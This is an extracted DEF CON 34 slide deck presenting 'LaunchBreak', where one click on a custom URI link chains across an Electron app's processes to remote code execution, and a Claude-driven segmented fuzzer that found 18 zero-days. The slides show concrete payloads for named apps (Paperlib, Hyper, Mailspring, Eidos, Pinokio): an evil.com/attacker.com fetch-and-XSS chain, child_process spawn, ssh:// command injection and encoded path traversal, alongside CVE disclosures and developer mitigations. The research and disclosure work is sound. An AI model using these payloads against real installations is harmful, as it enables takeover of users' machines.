---
title: "LaunchBreak a Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover"
speakers: ["Gavin Zhong", "Zhengyu Liu", "Jianjia Yu"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Gavin Zhong, Zhengyu Liu, Jianjia Yu - LaunchBreak a Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover - launchbreak 1 0.pdf"
pages: 48
sha256: "9e6ffa22c6c4353003fdf7fbc6eca7f0199e640473776db7728f6afd605c06be"
text_chars: 24304
ocr_pages: 0
has_ocr: false
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-12T00:17:58Z"
---
# LaunchBreak a Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover

**Speakers:** Gavin Zhong, Zhengyu Liu, Jianjia Yu  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Gavin Zhong, Zhengyu Liu, Jianjia Yu - LaunchBreak a Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover - launchbreak 1 0.pdf` (48 pages)


## Slide 1

LaunchBreak A Sip of Tea, a Click, and a Full Multi-stage Desktop Takeover

Jianjia Yu Zhengyu Liu Gavin Zhong Johns Hopkins University

Contributors: Ziyang Li, Yu Sun, Yinzhi Cao Aug. 2026 · DEFCON 34 ·  Las Vegas

## Slide 2

## WHOAMI

**Jianjia Yu** PhD, Johns Hopkins University

- DEF CON 33 speaker — The DOMino Effect

- Distinguished Papers @ CCS'23, S&P'25

- 40+ 0-days across extensions & mobile

**Zhengyu Liu** PhD student, Johns Hopkins University

- DEF CON 33 speaker — The DOMino Effect

- Distinguished Paper @ S&P'25

- Best Student Paper @ ICICS'22

- CTF: TheHackersCrew

**Gavin Zhong** PhD student, xxx

- MS Security Informatics, JHU · S&P'26

- 30+ CVEs in open-source projects ▸ CTF player with r3kapig (top-3 worldwide)

Contributors: Ziyang Li · Yu Sun · Yinzhi Cao · Johns Hopkins University

**LaunchBreak** ·  DEF CON 34

**03**

## Slide 3

## ROADMAP

1

Intro: AI desktop apps, custom URI, and LaunchBreak

2 LaunchBreak Systematizing: sources × cross-process flows × sinks 3 Proton: agentic segmented fuzzing Tea Time: 4 live end-to-end zero-day demos: Hyper · Eidos · 4 DeepChat · Pinokio 5 Mitigations & takeaways

**LaunchBreak** ·  DEF CON 34

**04**

## Slide 4

Introduction **0x01** AI desktop apps, custom URI, and LaunchBreak

## Slide 5

**§1 · INTRO**

## The AI boom pushes hundreds of Electron apps to ship with custom URI

**Chrome Chrome** https://myapp.com/mcp-install https://gitlab.com **Open myapp?** https://myapp.com/ wants to open this app. **Features: Features:** - Please click on this <u>link</u> - Please click on thisCancel Open <u>link myapp://mcp-install?q=xx</u> MCP install / plugin install / even prompt-driven actions

Example apps: Cherry Studio, Hyper, AFFiNE, DeepChat, Dive, Pinokio, …

**LaunchBreak** ·  DEF CON 34

**05**

## Slide 6

###### **§1 · INTRO**

The AI boom pushes hundreds of Electron apps to ship with custom URI

**Chrome Chrome One click, zero friction.** https://myapp.com/mcp-install https://gitlab.com **Open myapp?** https://myapp.com/ wants to open this app. **Features: Also: one click, full remote code execution.Features:** - Please click on this <u>link</u> - Please click on thisCancel Open <u>link</u>

<u>myapp://mcp-install?q=xx</u>

MCP install / plugin install / even prompt-driven actions

Example apps: Cherry Studio, Hyper, AFFiNE, DeepChat, Dive, Pinokio, …

**LaunchBreak** ·  DEF CON 34

**05**

## Slide 7

**§1 · INTRO**

## Custom URI 101

▸ Apps register an OS-level custom scheme:  myapp:// ▸ Different OS has its own registration + launch path macOS CFBundleURLTypes / LaunchServices Windows HKCR + shell open Linux .desktop handler **A single attacker-controlled URI → privileged app logic → RCE.**

**LaunchBreak** ·  DEF CON 34

**07**

## Slide 8

###### **§1 · MOTIVATING DEMO**

## Demo 0 — Paperlib: one-click RCE

Paperlib open-source reference manager (2.2k )

**LaunchBreak** ·  DEF CON 34

**09**

## Slide 9

###### **§1 · MOTIVATING DEMO**

## Demo 0 — Paperlib: what happened?

**Chrome**

https://gitlab.com/mal/repo **Features:** - Please click on this <u>link</u>

**Chrome** https://gitlab.com **Open Paperlib?** https://gitlab.com/ wants to open this app. **Features:** - Please click on this Cancel Open **1** <u>link</u> **2**

**Chrome Chrome** https://gitlab.com/malicious/r **Paperlib Paperlib** https://gitlab.com/malicious/repo epo Welcome to paperlib! Authors: xxx <script>xxx **Calculator.app** Authors:xxx **Features:** DOI: xxx **Features:** DOI: xxx1337 - Please click on this <u>link</u> - Please click on this <u>link</u> AC % ÷

**LaunchBreak** ·  DEF CON 34

**08**

## Slide 10

###### **§1 · MOTIVATING DEMO**

The exploit chain Payload I Payload II **A** parse **B** postMessage **C** fetch **D** render Main paperlib:// Utility attacker Renderer open-url URI fetch() server v-html sink handler **LaunchBreak** ·  DEF CON 34

**10**

## Slide 11

###### **§1 · MOTIVATING DEMO**

### Demo 0 — Paperlib: main process: URI parsing and message passing

**main.ts** (Main Process)

Payload I

paperlib://PLAPI.commandServ ice.run?args=["import-from", "https://evil.com/poc.html"]

- 1 app.on( " open-url " , (event, uri) => {

- 2 const { protocol, hostname, search } = new URL(uri); 3 const [api, service, method] = hostname.split("."); 4 const params = new URLSearchParams(search); 5 const args = JSON.parse(params.get("args") || "[]"); 6 global[api][service][method](args); });

- 7 8 global.PLAPI.commandService.run = function(args){

Custom URI parsing and handling

##### **A**

**B** Cross-process messaging

- 9 utilityPort.postMessage(args); };

**LaunchBreak** ·  DEF CON 34

**08**

## Slide 12

###### **§1 · MOTIVATING DEMO**

### Demo 0 — Paperlib: utility process: CSRF

#### **util.ts** (Utility Process)

- 1 port.onmessage = msg => {

- 2 const [methodName, ...methodArgs] = msg.data;

- 3 const fn = utilityMethods[methodName]; 4 fn(...methodArgs); };

- 5 const utilityMethods = {

- 6 "import-from": async (webUrl) => {

**C**

Fetch (Client-side Request Forgery) Introduces second payload

- 7 const text = await (await fetch(webUrl)) .text();

- 8 rendererPort.postMessage({ content: text }); 9 }, ... };

<img src=1 onerror="require('child_proc Payload II ess').spawn('open',['-a','Ca lculator'])">

**LaunchBreak** ·  DEF CON 34

**08**

## Slide 13

###### **§1 · MOTIVATING DEMO**

### Demo 0 — Paperlib: renderer process: DOM XSS

**paper-detail-view.vue** (Renderer Process)

- 1 port.onmessage = msg => { 2 slot1.push({ content: msg.data.content }); }; 3 <Section /* Vue Template */ 4 v-for="(item, index) in slot1" 5 :id="`detailspanel-slot1-${index}`" 6 :title="item.title"> 7 <div v-html="item.content"> </div> 8 </Section>

**D** DOM XSS -> Arbitrary command execution

**LaunchBreak** ·  DEF CON 34

**08**

## Slide 14

###### **§1 · MOTIVATING DEMO**

### Demo 0 — Paperlib: the ultimate secret

Payload I: paperlib URI

paperlib://PLAPI.commandService.run?args=%5B%22import-from%22%2 C%22https%3A%2F%2Fattacker.com%2Fmostly-harmless%2Fpaperlib_po c%2Fpay2.pdf%22%5D

Payload II: PDF containing the following payload, hosted on attacker.com

<img src="1" onerror="require('child_process').spawn('open', ['-a', 'Calculator'])">

**LaunchBreak** ·  DEF CON 34

**08**

## Slide 15

# Systematizing LaunchBreak **0x02** The complex chain behind the scene

## Slide 16

###### **§2 · BACKGROUND**

## Electron architecture

…

**Electron Framework** Bundled: Chromium + Node.js + libuv **Renderer Renderer ProcessesRenderer** Renderer: sandboxed web content Chromium pages, DOM Chromium pages, DOMChromium pages, DOM **Node** Preload: the guarded bridge between **Preload Integration** them. Exposed APIs Enabled Spawns Delegates Configures main/utility: full Node.js **UtilityUtility Main Process Utility Process ProcessesProcess** App lifecycle, Native APIs **Native Modules** Node native addons, OS integrations, Electron APIs **LaunchBreak** ·  DEF CON 34

**12**

## Slide 17

###### **§2 · BACKGROUND**

## Electron architecture

…

**Electron Framework** Bundled: Chromium + Node.js + libuv

**Renderer Renderer ProcessesRenderer Electron apps use IPC (inter-process communication) channels for** Renderer: sandboxed web content Chromium pages, DOM Chromium pages, DOMChromium pages, DOM **Node** Preload: the guarded bridge between **Preloadmessaging between processes Integration** them. Exposed APIs Enabled Spawns Delegates Configures main/utility: full Node.js **UtilityUtility Main Process Utility Process ProcessesProcess** App lifecycle, Native APIs **Native Modules** Node native addons, OS integrations, Electron APIs

**LaunchBreak** ·  DEF CON 34

**12**

## Slide 18

###### **§2 · BACKGROUND**

## Electron architecture

…

**Electron Framework**

Bundled: Chromium + Node.js + libuv

**Renderer Renderer ProcessesRenderer LaunchBreak abuses these IPC channels to carry taint across** Renderer: sandboxed web content Chromium pages, DOM Chromium pages, DOMChromium pages, DOM **Node** Preload: the guarded bridge between **processes, from a webpage all the way to spawn().Preload Integration** them. Exposed APIs Enabled Spawns Delegates Configures main/utility: full Node.js **UtilityUtility Main Process Utility Process ProcessesProcess** App lifecycle, Native APIs **Native Modules** Node native addons, OS integrations, Electron APIs

**LaunchBreak** ·  DEF CON 34

**12**

## Slide 19

###### **§2 · BACKGROUND**

## A lineage of Electron security research — and a shared blind spot

Electronegativity Black Hat 2017 static config auditing

2017

Preloading Insecurity Black Hat 2019 preload / IPC abuse

2019

ElectroVolt BH 2022 / DC 30 XSS → RCE escalation 2022

LaunchBreak DEF CON 34 browser click → RCE 2026

THE SHIFT

All assume the attacker is ALREADY INSIDE, e.g., XSS in the renderer, escalate to RCE **LaunchBreak** ·  DEF CON 34

attacker is OUTSIDE — one browser click, multi-process, multi-payload chain, to RCE

**13**

## Slide 20

###### **§2 · THE SHIFT**

## LaunchBreak starts from outside the app

PRIOR WORK — post-compromise

LAUNCHBREAK — pre-compromise

- Assumes XSS already in the renderer

- Needs a foothold to begin

- Starts from a browser click

- Chains across main / utility / renderer

- No foothold, no prior access required

ElectroVolt (BH'22) even hinted: “open-URL redirect can be turned into RCE someday.” Someday is today. And that URL is even outside.

**LaunchBreak** ·  DEF CON 34

**14**

## Slide 21

###### **§2 · SYSTEMATIZATION**

## **Systemization: LaunchBreak in three dimensions**

Sources **1**

how malicious content enters

- Inline-URL

- On-the-Fly Fetch

- Drop-and-Load

Sinks **2**

where the payload detonates

- 9 sink types

- intermediate vs terminal

- main / utility / renderer

- **3** Cross-process flows how taint travels

- multi-stage chains

- multi-source

- IPC / fetch / navigation

**LaunchBreak** ·  DEF CON 34

**15**

## Slide 22

###### **§2 · SYSTEMATIZATION**

## **Systemization: LaunchBreak in three dimensions**

Sources **1**

Sinks **2**

- **3** Cross-process flows

> how malicious content enters **Not a URI-parsing bug, but a multi-stage exploit pattern.** where the payload detonates how taint travels

▸ Inline-URL

- On-the-Fly Fetch

- Drop-and-Load

**sources × flows × sinks** ▸ 9 sink types

- intermediate vs terminal

- main / utility / renderer

▸ multi-stage chains

- multi-source

- IPC / fetch / navigation

**LaunchBreak** ·  DEF CON 34

**15**

## Slide 23

**§2 · DIMENSION 1**

## **Sources — how payload gets in**

**Inline-URL 12 / 18 zero-days**

Payload embedded directly in the URI

**On-the-Fly Fetch** URI triggers a fetch from an **4 / 18 zero-days** attacker server

**Drop-and-Load 2 / 18 zero-days**

URI makes the app load a local file through path traversal

myapp://run?cmd=<payload>

app://install?url=evil.com

app://open?path=20%20%Do wnloads/x.js

**LaunchBreak** ·  DEF CON 34

**16**

## Slide 24

###### **§2 · DIMENSION 2**

## **Sink categories — what it reaches**

intermediate vs terminal terminal sink = direct consequence (OS command). intermediate sink = forwards taint to the NEXT process. One API can be either, depending on process & config. This is what makes chains possible. E.g., executeJavaScript is terminal when NodeIntegration is true, but intermediate then not.

**LaunchBreak** ·  DEF CON 34

**17**

## Slide 25

**§2 · DIMENSION 2**

## **Sink categories — what it reaches**

|**Sink**|**Where**|**Pattern**|**Effect**|
|---|---|---|---|
|Command Execution|main/util|exec(T), spawn(T,{shell})|terminal|
|Code Execution|main/util|eval(T), new Function(T)|term/mid|
|Module Loading|main/util|require(T), import(T)|terminal|
|File System Write|main/util|fs.writeFile(T1,T2)|terminal|
|External Open|main|shell.openExternal/openPath(T)|terminal|
|Window Script Exec|main|webContents.executeJavaScript(T)|mid/term|
|DOM Script Exec|renderer|element.innerHTML = T|mid/term|
|Window Navigation|renderer|win.loadURL / location.href = T|mid/term|
|Subview Injection|renderer|iframe.src / webview.src = T|mid/term|

**LaunchBreak** ·  DEF CON 34

**17**

## Slide 26

###### **§2 · DIMENSION 3**

Cross-process exploit flows
Same entry point, wildly different cross-process routes. A few real cases:
PTY
URI main renderer
spawn
Hyper
main local server
URI
navigation require() .js file
Pinokio
utility renderer
URI main
fetch v-html
Paperlib

**Uniform trigger · diverse, multi-stage, app-specific chains → that's why one detector must generalize. LaunchBreak** ·  DEF CON 34

**18**

## Slide 27

###### **§2 · WHY IT WAS MISSED**

## Why largely ignored: core challenges

Static analysis

- Dynamic analysis (fuzzing)

Manual analysis

- cross-process data & control flow is hard to model

- dynamic dispatch: global[a][b][c](args)

- production code is minified

- / obfuscated

- cross-process chains → state explosion

- must satisfy strict URI/JSON parsing first

- multiplicative cost per extra process

- multi-source, multi-process chains to line up

- sanitization checks to bypass

- per-app logic — doesn't scale to 489 apps

Only one public blog (2020) ever touched this. No paper, no tooling.

**LaunchBreak** ·  DEF CON 34

**19**

## Slide 28

_Practical detection via agentic segmented fuzzing_

Proton **0x03**

## Slide 29

###### **§3 · THE IDEA**

## Why end-to-end fuzzing explodes

- Model a fuzzing campaign's cost by its program state

- space:

   - |I| = instructions on the path,  N = input space

- One monolithic campaign to validate a path:

**single-path cost**

O( |I| · N )

**The intuition**

- Every extra process multiplies the search.

- A payload that fails to cross boundary #1 wastes

- all the budget you'd spend past it.

- Deep, cross-process bugs become practically

- unreachable.

- So: don't fuzz the whole chain at once.

two segments, end-to-end:

- O( (N_a + N_b) · |I_a| · |I_b| )   ← multiplicative

**LaunchBreak** ·  DEF CON 34

**21**

## Slide 30

###### **§3 · THE IDEA**

## Segment to conquer

Break the chain at natural boundaries → fuzz each segment alone → recompose. Multiplicative becomes additive.

Dataflow-independent

different payload sources

O(N_a|I_a| + N_b|I_b|)

Partially dependent IPC between processes

O(N_a|I_a| + N_b|I_b|)

Fully dependent invertible URL / JSON parsing

O(N_b · |I'_a|)

Invertible parsing (new URL, JSON.parse) is the killer trick: don't brute-force valid inputs — reconstruct them backwards.

**LaunchBreak** ·  DEF CON 34

**22**

## Slide 31

###### **§3 · DESIGN**

## How Proton works

Phase I — Agentic static analysis

- LLM-guided taint analysis over the repo

   - finds source → sink paths

   - picks segmentation boundaries – emits per-segment fuzzing harnesses

   - + initial seeds & input reconstructors

- Runs on Claude — agent + file/grep tools

Phase II — Segmented fuzzing

- Fuzz each segment independently

   - canaries detect taint reaching a sink – oracles = parse errors / injected markers

   - reconstruct segment inputs backward

- compose → validate the full chain end-to-end

**LaunchBreak** ·  DEF CON 34

**23**

## Slide 32

**§3 · DESIGN**

## **The three moving parts**

**Harness synthesis**

LLM writes a small patch that registers a per-segment entry point (global.__proton__.harness) so the fuzzer can drive that segment directly — no need to replay earlier processes.

**Runtime canaries**

Hooks on dangerous APIs (spawn, executeJavaScript, innerHTML…) fire when an attacker-controlled marker reaches them — a precise, low-false-positive oracle.

**Invertible reconstruction**

For parse-heavy segments, Proton inverts JSON.parse / new URL to synthesize a valid input for a desired parsed value — skipping the sparsity problem entirely.

**LaunchBreak** ·  DEF CON 34

**24**

## Slide 33

**§3 · RESULTS**

## Proton in the wild

489 18 11 Electron apps zero-days CVEs audited (17 RCE · 1 AFW) assigned

11 fixes deployed

$$

Vercel bug bounty (Hyper)

▸ 88 / 489 apps flagged in Phase I · median static analysis ≈ 57s, ≈13k tokens. ▸ Median time-to-exposure 28 min; 82% of bugs found within 30 min of fuzzing. ▸ 13 acknowledgments from maintainers · all findings past their 45-day grace period. ▸ Affected: AI assistants, email clients, music players, EPUB readers, dev tools.

**LaunchBreak** ·  DEF CON 34

**25**

## Slide 34

**§3 · RESULTS**

## The wall of exploits

|Application|Stars|Impact|Status|CVE / Advisory|
|---|---|---|---|---|
|AFFiNE|59.7k|RCE|Fixed|CVE-2026-21853|
|Motrix|49.8k|AFW|Reported|—|
|Hyper|44.5k|RCE|Ack·bounty|—|
|Cherry Studio|35.4k|RCE|Fixed|CVE-2025-54063|
|Mailspring|16.8k|RCE|Reported|—|
|DevHub|10k|RCE|Reported|—|
|MusicFreeDesktop|7k|RCE|Ack|CVE-2025-64514|
|Pinokio|5.7k|RCE|Fixed|CVE-2025-44109|
|DeepChat|4.9k|RCE|Fixed|CVE-2025-55733|
|LBRY Desktop|3.5k|RCE|Reported|CVE-2025-50477|
|Eidos|3k|RCE|Fixed|CVE-2025-54374|
|Thorium Reader|2.4k|RCE|Fixed|GHSA-3953-2fc4|
|Paperlib|2k|RCE|Fixed|CVE-2025-64743|
|TidGi-Desktop|1.9k|RCE|Fixed|GHSA-fxjh-xr2f|
|Muffon|1.9k|RCE|Fixed|CVE-2025-55204|
|Dive|1.6k|RCE|Fixed|CVE-2025-58176|
|Vieb|1.5k|RCE|Fixed|GHSA-h2fq-667q|
|nanovault|186|RCE|Reported|CVE-2025-8535|

**Dive — CVE-2025-58176**

**From 60k-star flagship apps to 186-star side projects — the pattern is everywhere.**

**LaunchBreak** ·  DEF CON 34

**26**

## Slide 35

_End-to-end zero-day case studies_

Tea Time **0x04**

## Slide 36

###### **§4 · DEMO 1 (A) — MAIN → RENDERER → MAIN**

## Hyper — ssh:// to your shell

parse

IPC

Main Renderer ssh:// URI parseUrl build cmd

IPC exec Main / PTY spawn

▸ Vercel's terminal emulator ssh://;id/x  → id runs (44.5k★). // renderer assembles from URL ▸ URI parsed in main → fields ▶  INSERT LIVE DEMO — command built in renderer → cmd = `ssh ${resource}`   // ';id' sent back to the PTY (main) to Hyper pty.write(cmd)   // → shell execute. ssh://;id/x  and IFS _→_ Calculator variant // IFS variant: ▸ Vercel acknowledged it with ssh://@;a=open;b=-a;c=Calculat a bug bounty. or.app; $a$IFS$b$IFS$c  → open -a ▸ Every dev still running Hyper Calculator carries an RCE.

**LaunchBreak** ·  DEF CON 34

**28**

## Slide 37

###### **§4 · DEMO 2 (B) — MAIN → RENDERER (XSS) → RCE**

## Mailspring — mailto: and a CSP collapse

parse XSS escape
Main Renderer file:// iframe
mailto: URI
parse body innerHTML XSS require()
▸ Popular open-source email client
mailto: → require()
(16.8k★).
// mailto: body →  ▶  INSERT LIVE
▸ nodeIntegration ON, contextIsolation
dangerouslySetInnerHTML DEMO —
OFF.
mailto:?body=<iframe
Mailspring
   src=file://~/Downloads/x.html> ▸ mailto: body reaches
mailto:  →  RCE (CSP
// UNEDITABLE_TAGS sanitizer  dangerouslySetInnerHTML via a
collapse)
bypass
UNEDITABLE_TAGS bypass.
// app on file:// → CSP 'self'
▸ Served from file:// → CSP 'self'
//   = every local file is allowed
win.parent.require('child_process') whitelists every local file → planted
iframe calls require('child_process').

**LaunchBreak** ·  DEF CON 34

**29**

## Slide 38

**§4 · DEMO 3 (C) — MAIN → RENDERER → WEBVIEW (XSS→PP) → RCE**

## Thorium Reader — double prototype pollution

parse render escape Main webview thorium:// URI open-url sandboxed XSS ▸ EPUB reader by the European two chained prototype pollutions Digital Reading Lab (2.4k★). // EPUB renders in a sandboxed ▸ contextIsolation OFF + webview nodeIntegration ON — but the // PP1: hijack EPUB runs in a sandboxed Function.prototype.apply webview with no direct Node. //    → leak ipcRenderer // flood listeners → ▸ PP1 leaks ipcRenderer; a listener MaxListeners warn flood + PP2 captures process. // PP2: hook EventEmitter.emit //    → capture process ▸ Require-less RCE: process.binding('spawn_sync') process.binding('spawn_sync').

PP1 → PP2 leak process ▶  INSERT LIVE DEMO — Thorium Reader thorium:// _→_ RCE (double PP)  · GHSA-3953-2fc4-qqxp

**LaunchBreak** ·  DEF CON 34

**30**

## Slide 39

**§4 · DEMO 4 (D) — MAIN → RENDERER → MAIN → DB → MAIN**

## Eidos — a 5-stage XSS→RCE (CVE-2025-54374)

string IPC addExten re-init break sion Renderer Main SQLite **new Function()** eidos:// URI executeJS XSS ipcRenderer.invoke poison UDF spawn_sync ▸ Local-first AI workspace; secure-by-default renderer nodeIntegration OFF, contextIsolation // 1. break out of window.open ON — 'secure by default'. ▶  INSERT LIVE string eidos://block/'+alert(1)-1*'+@x ▸ Single quotes & commas aren't DEMO — Eidos // 2. invoke privileged IPC URL-encoded → JS string break-out. eidos:// _→_ eidos.invoke('sqlite-msg',{addExtens Calculator (5-stage) ▸ No require()? Use ion}) process.binding('spawn_sync'). // 3. switch space → initUDF() new Function('return('+code+')')() ▸ 1000+ char URL-safe payload: // 4. require-less RCE: Object.create(null), Array.of(), process.binding('spawn_sync').spaw fromCharCode().

> **LaunchBreak** n(..)  ·  DEF CON 34

**31**

## Slide 40

**§4 · DEMO 5 (E) — MAIN (TOP-LEVEL NAV) → LOCAL SERVER**

## Pinokio — the installer is the exploit (CVE-2025-44109)

navigate /_api/ traverse Main local server loader.load(.js) pinokio:// URI top-level nav redirect + ..%2F Node exec ▸ Browser-like app that runs a local using Pinokio as designed server to install AI tools by loading .js // auto-download to ~/Downloads: on demand. Content-Disposition: attachment ▸ Unvalidated redirect + %2E%2E path // URI with double-encoded ▶  INSERT LIVE DEMO traversal → escape app dir → load traversal: — Pinokio attacker's dropped calc.js. pinokio://?uri=~/_api/ pinokio:// _→_ Calculator ▸ The install mechanism itself is the (RCE) %252E%252E%252F..Downloads/ca execution primitive. lc.js ▸ Scenario: 'faster model installer!' on // loads & runs any .js: kernel.loader.load(filepath) r/StableDiffusion → thousands popped.

**LaunchBreak** ·  DEF CON 34

**32**

## Slide 41

**§4 · DEMO 6 — MULTI-SOURCE · MINIFIED**

## DeepChat — two sources, obfuscated IPC (CVE-2025-55733)

Source I

+ drop **route**

deepchat://

downloaded file Source II

Main minified IPC 'a342'

**handler** command inj

- Two things fire at once: a deepchat:// link AND a forced-download JS file.

- Browser auto-drops the file to ~/Downloads; the URI makes the app load it.

- Payload traverses minified IPC channels (names like 'a342') to a privileged handler → command injection.

▸ Proton's LLM agent de-obfuscated the channel names from data flow — obfuscation ≠ safety.

**DeepChat CVE-2025-55733**

**LaunchBreak** ·  DEF CON 34

**33**

## Slide 42

###### **§4 · RECAP**

## One trigger, many chains

▸ Every demo started the same way: a single browser click on a custom URI.

▸ Every demo ended the same way: attacker code on the victim's machine.

▸ Everything in between was different — IPC relays, navigation, webviews, databases, local servers, prototype pollution.

▸ That diversity is exactly why manual review and single-strategy tools miss it — and why segmented fuzzing generalizes.

**LaunchBreak** ·  DEF CON 34

**34**

## Slide 43

# Mitigations & Takeaways **0x05** _Your click, your choice_

## Slide 44

###### **§5 · MITIGATIONS**

## For developers

- Treat custom URI handlers as an UNTRUSTED external boundary — the danger comes from outside the app.

- Sanitize & validate every field before it flows into privileged logic.

- Reduce privileged URI-triggered flows — least privilege at the handler.

- Validate domains with real URL parsing + allowlists, not string matching.

- Lock down webContents: nodeIntegration off, contextIsolation on, sandbox on.

- Isolate untrusted content in webviews; never serve the app from file://.

- Prompt for approval before acting on external URIs.

**LaunchBreak** ·  DEF CON 34

**36**

## Slide 45

###### **§5 · MITIGATIONS**

## For platforms & users

Platforms & browsers

- Show the FULL URI contents in the launch prompt.

- Reduce opaque payload delivery to desktop apps.

You (users)

   - Treat custom URI links like any untrusted link.

   - Never check “Always allow” — that removes the last human barrier.

- Make browser-to-app handoff auditable and informed.

- Your click, your choice. Agency at the doorway.

**LaunchBreak** ·  DEF CON 34

**37**

## Slide 46

###### **§5 · TAKEAWAYS**

## Three things to walk out with

Developers The danger comes from outside (the desktop app).

Users

Never “Always allow.”

Researchers

Segment to conquer.

When state space explodes, segment the chain into independent, composable pieces.

**LaunchBreak** ·  DEF CON 34

**38**

## Slide 47

###### **§5 · RELEASE**

## We're releasing everything

▸ Proton — the agent-guided segmented fuzzer that found all 18.

▸ Built on jazzer.js + libfuzzer, with Claude driving Phase-I analysis.

- PoCs for every vulnerability we disclosed.

**LaunchBreak** ·  DEF CON 34

**39**

## Slide 48

A sip of tea, a click, and your desktop was never yours alone.

▸ Thank you — questions?

▸ Jianjia Yu · Zhengyu Liu · Jiacheng Zhong  —  Johns Hopkins University

▸ cs.jhu.edu/~susuyu  ·  x.com/yujianjiasuzy

Contributors: Ziyang Li · Yu Sun · Yinzhi Cao

**LaunchBreak** ·  DEF CON 34

**40**
